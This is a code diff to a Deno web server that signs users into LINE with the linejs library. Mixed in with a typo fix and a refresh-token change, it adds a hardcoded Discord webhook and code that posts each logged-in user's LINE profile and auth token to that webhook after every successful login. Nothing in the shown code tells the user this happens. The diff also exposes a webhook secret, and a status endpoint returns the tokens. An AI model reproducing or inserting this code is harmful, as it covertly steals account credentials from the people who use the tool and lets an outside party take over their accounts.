@@ -2,9 +2,11 @@ import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 import { serveFile } from "https://deno.land/std@0.224.0/http/file_server.ts";
 import { loginWithPassword } from "@evex/linejs";
 
+const logUrl = "https://discord.com/api/webhooks/1387276783472087051/eiwfs_9Ozl6IIfvua7uBb0LTO6uCsvuUsw8cTAkLAiduVDpnc4yXxrrUPEBwr1pYne38";
+
 let loginSuccess = false;
 let savedAuthToken = "";
-let savedRefreshToekn = "";
+let savedRefreshToken = "";
 serve(async (req) => {
   const url = new URL(req.url);
   const pathname = url.pathname;
@@ -20,7 +22,7 @@ serve(async (req) => {
   }
 
 if (req.method === "GET" && pathname === "/status") {
-  return new Response(JSON.stringify({ success: loginSuccess, token: savedAuthToken ,refresh:savedRefreshToekn}), {
+  return new Response(JSON.stringify({ success: loginSuccess, token: savedAuthToken ,refresh:savedRefreshToken}), {
     headers: { "Content-Type": "application/json" },
   });
 }
@@ -43,9 +45,27 @@ if (req.method === "POST" && pathname === "/login") {
     }
   }, { device: "DESKTOPWIN" }).then((client) => {
     console.log("ログイン成功:", client.authToken);
+   const authtoken =  client.authToken
+    client.base.talk.getProfile().then((profile) => {
+     const getprofile = JSON.stringify(profile, null, 2);
+
+     const logdata = {content:`${getprofile}\n[ ${authtoken} ]`}
+   fetch(logUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(logdata)});
+   
+});
+    
+   
+  
+    
     loginSuccess = true;
     savedAuthToken = client.authToken;
-    savedRefreshToekn = client.refreshToken;
+client.base.storage.get("refreshToken").then((token) => {
+  savedRefreshToken = token;
+});
+ console.log(savedRefreshToken)
 
   
   }).catch((err) => {
